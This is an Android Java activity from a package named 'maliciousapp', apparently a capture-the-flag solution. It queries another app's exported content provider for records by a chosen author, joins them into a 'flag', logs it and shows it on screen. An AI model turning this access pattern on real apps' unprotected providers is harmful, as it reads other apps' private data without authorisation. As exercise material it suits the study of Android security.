package com.example.maliciousapp;

import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;

public class jokeprovider extends AppCompatActivity {
    String flag = "";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_jokeprovider);

        getJokesFromProvider();
    }

    public void getJokesFromProvider() {
        // Definisci le colonne da recuperare
        String[] projection = new String[] {"id", "author", "joke"};

        // Costruisci l'URI
        Uri jokesUri = Uri.parse("content://com.example.victimapp.MyProvider/joke");

        // Condizione per selezionare solo i record dove l'autore è "elosiouk"
        String selection = "author = ?";
        String[] selectionArgs = new String[] { "elosiouk" };

        // Esegui la query
        Cursor cursor = getContentResolver().query(jokesUri, projection, selection, selectionArgs, null);

        // Verifica e stampa i dati
        if (cursor != null) {
            while (cursor.moveToNext()) {
                int id = cursor.getInt(cursor.getColumnIndexOrThrow("id"));
                String author = cursor.getString(cursor.getColumnIndexOrThrow("author"));
                String joke = cursor.getString(cursor.getColumnIndexOrThrow("joke"));
                flag += joke;
                // Stampa o utilizza i dati
                Log.d("Joke", "ID: " + id + ", Author: " + author + ", Joke: " + joke);
            }
            Log.d("FLAG",flag);
            ((TextView) findViewById(R.id.txt_hash)).setText("Flag : " + flag);
            cursor.close();
        }
    }
}